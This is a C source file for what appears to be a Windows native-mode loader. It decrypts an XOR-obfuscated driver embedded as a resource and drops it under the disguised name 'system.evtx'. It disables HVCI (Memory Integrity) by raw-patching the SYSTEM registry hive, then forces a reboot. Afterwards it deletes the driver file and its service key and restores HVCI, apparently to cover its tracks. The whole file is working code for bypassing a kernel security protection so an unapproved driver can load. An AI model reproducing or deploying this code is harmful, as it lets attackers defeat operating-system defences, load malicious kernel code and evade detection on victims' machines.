#include "SetupManager.h"

extern PWSTR MmGetPoolDiagnosticString(void);

#define IDR_DRV 101
#define OmniDriver_SIZE 14024

// 1 MB chunk size is optimal for Native I/O operations
#define SCAN_CHUNK_SIZE (1024 * 1024) 
// Safety margin (Overlap) prevents pattern truncation at chunk boundaries.
// Must be larger than: pattern length (31) + rolling scan window (128).
#define OVERLAP_SIZE    (256) 

static const UCHAR XOR_KEY[] = { 0xA0, 0xE2, 0x80, 0x8B, 0xE2, 0x80, 0x8C };
static const SIZE_T XOR_KEY_LEN = sizeof(XOR_KEY);

// ============================================================================
// RESOURCE EXTRACTION UTILS
// ============================================================================

PVOID FindResourceData(ULONG resourceId, PULONG outSize) {
    PVOID imageBase = NULL;

    #ifdef _M_X64
        imageBase = (PVOID)*(ULONGLONG*)((UCHAR*)__readgsqword(0x60) + 0x10);
    #else
        imageBase = (PVOID)*(ULONG*)((UCHAR*)__readfsdword(0x30) + 0x08);
    #endif

    if (!imageBase) {
        DEBUG_LOG(L"DEBUG: Cannot get image base\r\n");
        return NULL;
    }

    DEBUG_LOG(L"DEBUG: Image base found\r\n");

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;

    if (dosHeader->e_magic != 0x5A4D) {
        DEBUG_LOG(L"DEBUG: Invalid DOS header\r\n");
        return NULL;
    }

    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((UCHAR*)imageBase + dosHeader->e_lfanew);
    if (ntHeaders->Signature != 0x4550) {
        DEBUG_LOG(L"DEBUG: Invalid PE signature\r\n");
        return NULL;
    }

    PIMAGE_DATA_DIRECTORY resourceDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE];
    if (resourceDir->Size == 0) {
        DEBUG_LOG(L"DEBUG: No resource directory\r\n");
        return NULL;
    }

    PIMAGE_RESOURCE_DIRECTORY resRoot = (PIMAGE_RESOURCE_DIRECTORY)((UCHAR*)imageBase + resourceDir->VirtualAddress);
    PIMAGE_RESOURCE_DIRECTORY_ENTRY resEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(resRoot + 1);

    for (ULONG i = 0; i < (ULONG)(resRoot->NumberOfNamedEntries + resRoot->NumberOfIdEntries); i++) {
        if (!resEntry[i].NameIsString && resEntry[i].Id == 10) {
            
            PIMAGE_RESOURCE_DIRECTORY typeDir = (PIMAGE_RESOURCE_DIRECTORY)((UCHAR*)resRoot + (resEntry[i].OffsetToDirectory & 0x7FFFFFFF));
            PIMAGE_RESOURCE_DIRECTORY_ENTRY typeEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(typeDir + 1);

            for (ULONG j = 0; j < (ULONG)(typeDir->NumberOfNamedEntries + typeDir->NumberOfIdEntries); j++) {
                if (!typeEntry[j].NameIsString && typeEntry[j].Id == resourceId) {
                    
                    PIMAGE_RESOURCE_DIRECTORY nameDir = (PIMAGE_RESOURCE_DIRECTORY)((UCHAR*)resRoot + (typeEntry[j].OffsetToDirectory & 0x7FFFFFFF));
                    PIMAGE_RESOURCE_DIRECTORY_ENTRY nameEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(nameDir + 1);

                    if (nameDir->NumberOfIdEntries > 0) {
                        PIMAGE_RESOURCE_DATA_ENTRY dataEntry = (PIMAGE_RESOURCE_DATA_ENTRY)((UCHAR*)resRoot + nameEntry[0].OffsetToData);
                        *outSize = dataEntry->Size;
                        return (PVOID)((UCHAR*)imageBase + dataEntry->OffsetToData);
                    }
                }
            }
        }
    }

    return NULL;
}

BOOLEAN ExtractOmniDriverFromResource(void) {
    ULONG resourceSize = 0;
    PVOID resourceData = FindResourceData(IDR_DRV, &resourceSize);

    if (!resourceData || resourceSize != OmniDriver_SIZE) {
        DisplayMessage(L"FAILED: Cannot find non-compliant driver resource\r\n");
        return FALSE;
    }

    DEBUG_LOG(L"INFO: Extracting non-compliant driver from resource...\r\n");

    UCHAR decryptedData[OmniDriver_SIZE];

    UCHAR* srcData = (UCHAR*)resourceData;
    for (SIZE_T i = 0; i < OmniDriver_SIZE; i++) {
        decryptedData[i] = srcData[i] ^ XOR_KEY[i % XOR_KEY_LEN];
    }

    UNICODE_STRING usFilePath;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hFile;
    LARGE_INTEGER byteOffset;
    NTSTATUS status;

    RtlInitUnicodeString(&usFilePath, OmniDriver_Log);
    InitializeObjectAttributes(&oa, &usFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateFile(&hFile, FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb,
                         NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF,
                         FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

    if (!NT_SUCCESS(status)) {
        DisplayMessage(L"FAILED: Cannot create temporary driver file");
        DisplayStatus(status);
        return FALSE;
    }

    byteOffset.QuadPart = 0;
    status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb, decryptedData,
                        OmniDriver_SIZE, &byteOffset, NULL);

    NtClose(hFile);

    if (!NT_SUCCESS(status)) {
        DisplayMessage(L"FAILED: Cannot write driver file");
        DisplayStatus(status);
        return FALSE;
    }

    DEBUG_LOG(L"SUCCESS: Non-compliant driver extracted to system.evtx\r\n");
    return TRUE;
}

NTSTATUS CleanupOmniDriver(void) {
    UNICODE_STRING usFilePath;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hFile;
    FILE_DISPOSITION_INFORMATION dispInfo;
    NTSTATUS status;

    RtlInitUnicodeString(&usFilePath, OmniDriver_Log);
    InitializeObjectAttributes(&oa, &usFilePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    status = NtOpenFile(&hFile, DELETE | SYNCHRONIZE, &oa, &iosb,
                       FILE_SHARE_DELETE, FILE_SYNCHRONOUS_IO_NONALERT);

    if (NT_SUCCESS(status)) {
        dispInfo.DeleteFile = TRUE;
        NtSetInformationFile(hFile, &iosb, &dispInfo, sizeof(dispInfo), 13);
        NtClose(hFile);
        DEBUG_LOG(L"INFO: Temporary driver file deleted\r\n");
    }

    WCHAR fullServicePath[MAX_PATH_LEN];
    UNICODE_STRING usServiceName;
    HANDLE hKey;
    PWSTR driverName = MmGetPoolDiagnosticString();

    wcscpy(fullServicePath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
    wcscat(fullServicePath, driverName);

    RtlInitUnicodeString(&usServiceName, fullServicePath);
    InitializeObjectAttributes(&oa, &usServiceName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenKey(&hKey, DELETE, &oa);
    if (NT_SUCCESS(status)) {
        NtDeleteKey(hKey);
        NtClose(hKey);
        DEBUG_LOG(L"INFO: Non-compliant driver registry key deleted\r\n");
    }

    return STATUS_SUCCESS;
}

SIZE_T FindPatternInBuffer(PUCHAR buffer, SIZE_T bufferSize, PUCHAR pattern, SIZE_T patternSize) {
    for (SIZE_T i = 0; i <= bufferSize - patternSize; i++) {
        BOOLEAN match = TRUE;
        for (SIZE_T j = 0; j < patternSize; j++) {
            if (buffer[i + j] != pattern[j]) {
                match = FALSE;
                break;
            }
        }
        if (match) return i;
    }
    return (SIZE_T)-1;
}

// ============================================================================
// HIVE PATCHING (CHUNKED ROLLING SCAN)
// ============================================================================

BOOLEAN PatchSystemHiveHVCI(BOOLEAN enable) {
    UNICODE_STRING usFilePath;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hFile;
    NTSTATUS status;
    
    static UCHAR chunkBuffer[SCAN_CHUNK_SIZE]; 
    
    LARGE_INTEGER fileOffset;
    ULONG bytesRead;
    UCHAR newValue = enable ? 0x01 : 0x00;

    // Pattern: "HypervisorEnforcedCodeIntegrity"
    static const UCHAR hvciPattern[31] = {
        0x48,0x79,0x70,0x65,0x72,0x76,0x69,0x73,0x6F,0x72,
        0x45,0x6E,0x66,0x6F,0x72,0x63,0x65,0x64,0x43,0x6F,
        0x64,0x65,0x49,0x6E,0x74,0x65,0x67,0x72,0x69,0x74,0x79
    };

    DEBUG_LOG(L"DEBUG: Opening SYSTEM hive (Chunked Mode)...\r\n");

    RtlInitUnicodeString(&usFilePath, L"\\SystemRoot\\System32\\config\\SYSTEM");
    InitializeObjectAttributes(&oa, &usFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenFile(&hFile, FILE_READ_DATA | FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb,
                       FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                       FILE_OPEN_FOR_BACKUP_INTENT | FILE_SYNCHRONOUS_IO_NONALERT);

    if (!NT_SUCCESS(status)) {
        DisplayMessage(L"FAILED: Cannot open SYSTEM hive");
        DisplayStatus(status);
        return FALSE;
    }

    // Query file size to control the scanning loop
    FILE_STANDARD_INFORMATION fileInfo;
    status = NtQueryInformationFile(hFile, &iosb, &fileInfo, sizeof(fileInfo), FileStandardInformation);
    if (!NT_SUCCESS(status)) {
        NtClose(hFile);
        DisplayMessage(L"FAILED: Cannot query hive size");
        return FALSE;
    }

    ULONGLONG fileSize = (ULONGLONG)fileInfo.EndOfFile.QuadPart;
    ULONGLONG currentPos = 0;
    ULONG patchCount = 0;
    ULONG skipCount = 0;

    fileOffset.QuadPart = 0;

    // --- MAIN LOOP: CHUNK BY CHUNK ---
    while (currentPos < fileSize) {
        
        // Read next file chunk (1 MB)
        status = NtReadFile(hFile, NULL, NULL, NULL, &iosb, chunkBuffer, SCAN_CHUNK_SIZE, &fileOffset, NULL);
        
        // Handle read errors or EOF scenarios
        if (!NT_SUCCESS(status)) {
             if (status == 0x103 /*STATUS_PENDING*/) {
                 // Rare in sync mode, but handled by ignoring here as buffer fills
             } else if (status != 0x80000011 /*STATUS_END_OF_FILE*/) {
                 break; // Generic read error
             }
        }

        bytesRead = (ULONG)iosb.Information;
        if (bytesRead == 0) break;

        // --- IN-CHUNK SCANNING ---
        SIZE_T searchStart = 0;
        
        while (searchStart < bytesRead) {
            // 1. Find key name pattern in current chunk
            SIZE_T patternOffset = FindPatternInBuffer(chunkBuffer + searchStart, bytesRead - searchStart, (PUCHAR)hvciPattern, 31);
            
            if (patternOffset == (SIZE_T)-1) {
                break; // Not found in remainder of this chunk
            }
            
            patternOffset += searchStart; // Convert to chunk-relative offset

            // 2. Rolling Scan: Look for DWORD data signature (04 00 00 80) in 128-byte window
            SIZE_T nameEnd = patternOffset + 31;
            SIZE_T valueHeaderOffset = (SIZE_T)-1;

            // Ensure scan window fits in buffer
            // If it exceeds, the Overlap mechanism handles it in the next main loop iteration
            if (nameEnd + 128 < bytesRead) {
                for (SIZE_T k = 0; k < 128; k++) {
                    if (chunkBuffer[nameEnd + k] == 0x04 && 
                        chunkBuffer[nameEnd + k + 1] == 0x00 && 
                        chunkBuffer[nameEnd + k + 2] == 0x00 && 
                        chunkBuffer[nameEnd + k + 3] == 0x80) {
                        
                        valueHeaderOffset = nameEnd + k;
                        break;
                    }
                }
            }

            if (valueHeaderOffset != (SIZE_T)-1) {
                // Header found. Value is located 4 bytes after.
                SIZE_T actualValueOffsetChunk = valueHeaderOffset + 4;
                UCHAR currentValue = chunkBuffer[actualValueOffsetChunk];

                // Sanity check: Value must be boolean (0 or 1)
                if (currentValue == 0x00 || currentValue == 0x01) {
                    if (currentValue == newValue) {
                        skipCount++;
                    } else {
                        // --- SURGICAL STRIKE WRITE ---
                        // Calculate absolute file offset
                        LARGE_INTEGER writeOffset;
                        writeOffset.QuadPart = currentPos + actualValueOffsetChunk;

                        // Write only 1 byte at precise location
                        status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb, &newValue, 1, &writeOffset, NULL);
                        
                        if (NT_SUCCESS(status)) {
                            patchCount++;
                            DEBUG_LOG(L"DEBUG: HVCI value patched\r\n");
                        }
                    }
                }
            }
            
            // Continue searching within this chunk (handle multiple instances)
            searchStart = patternOffset + 31;
        }

        // --- PREPARE FOR NEXT CHUNK ---
        
        if (bytesRead < SCAN_CHUNK_SIZE) {
            break; // EOF reached
        }

        // OVERLAP ADJUSTMENT:
        // Rewind file pointer by OVERLAP_SIZE to catch patterns split across chunk boundaries.
        currentPos += (bytesRead - OVERLAP_SIZE);
        fileOffset.QuadPart = currentPos;
    }

    // --- FINALIZATION: REBOOT OR EXIT ---

    if (patchCount > 0) {
        DisplayMessage(L"SUCCESS: HVCI hive patched\r\n");
        
        // Flush buffers to physical media
        NtFlushBuffersFile(hFile, &iosb);
        NtClose(hFile);
        
        return TRUE; 
    }

    // Normal closure if no changes made
    NtClose(hFile);

    if (skipCount > 0) {
        DEBUG_LOG(L"INFO: Already disabled.\r\n");
        return TRUE;
    }

    DisplayMessage(L"FAILED: Pattern not found (Chunked Scan)\r\n");
    return FALSE;
}

// ============================================================================
// MAIN HVCI CONTROL LOGIC
// ============================================================================

BOOLEAN CheckAndDisableHVCI(void) {
    UNICODE_STRING usKeyPath, usValueName;
    OBJECT_ATTRIBUTES oa;
    HANDLE hKey = NULL;
    NTSTATUS status;
    UCHAR buffer[256];
    ULONG resultLength;
    PKEY_VALUE_PARTIAL_INFORMATION kvpi;
    ULONG currentValue;

    RtlInitUnicodeString(&usKeyPath, HVCI_REG_PATH);
    InitializeObjectAttributes(&oa, &usKeyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenKey(&hKey, KEY_READ, &oa);
    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    RtlInitUnicodeString(&usValueName, L"Enabled");
    memset_impl(buffer, 0, sizeof(buffer));

    status = NtQueryValueKey(hKey, &usValueName, KeyValuePartialInformation,
                            buffer, sizeof(buffer), &resultLength);

    NtClose(hKey);

    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    kvpi = (PKEY_VALUE_PARTIAL_INFORMATION)buffer;

    if (kvpi->Type != REG_DWORD || kvpi->DataLength != sizeof(ULONG)) {
        return FALSE;
    }

    currentValue = *(ULONG*)kvpi->Data;

    if (currentValue == 1) {
        DisplayMessage(L"INFO: HVCI (Memory Integrity) is enabled\r\n");
        DisplayMessage(L"INFO: Disabling HVCI via SYSTEM hive patch...\r\n");

        DEBUG_LOG(L"DEBUG: About to call PatchSystemHiveHVCI(FALSE)...\r\n");

        BOOLEAN patchResult = PatchSystemHiveHVCI(FALSE);

        DEBUG_LOG(L"DEBUG: PatchSystemHiveHVCI returned\r\n");

        if (!patchResult) {
            DisplayMessage(L"FAILED: Cannot patch SYSTEM hive\r\n");
            return FALSE;
        }

        DisplayMessage(L"SUCCESS: HVCI disabled in SYSTEM hive\r\n");
        DisplayMessage(L"INFO: Initiating system reboot...\r\n");

		status = NtShutdownSystem(1);

		if (!NT_SUCCESS(status)) {
			DisplayMessage(L"DEBUG: NtShutdownSystem failed");
			DisplayStatus(status);
			return FALSE;
		}

		DisplayMessage(L"INFO: Waiting for system restart...\r\n");
		while (TRUE) {
		}
    }

    return FALSE;
}

NTSTATUS RestoreHVCI(void) {
    DisplayMessage(L"INFO: Re-enabling HVCI for next boot...\r\n");

    if (!PatchSystemHiveHVCI(TRUE)) {
        DisplayMessage(L"WARNING: Cannot restore HVCI in SYSTEM hive\r\n");
        return STATUS_NO_SUCH_DEVICE;
    }

    DisplayMessage(L"SUCCESS: HVCI will be re-enabled on next boot\r\n");
    return STATUS_SUCCESS;
}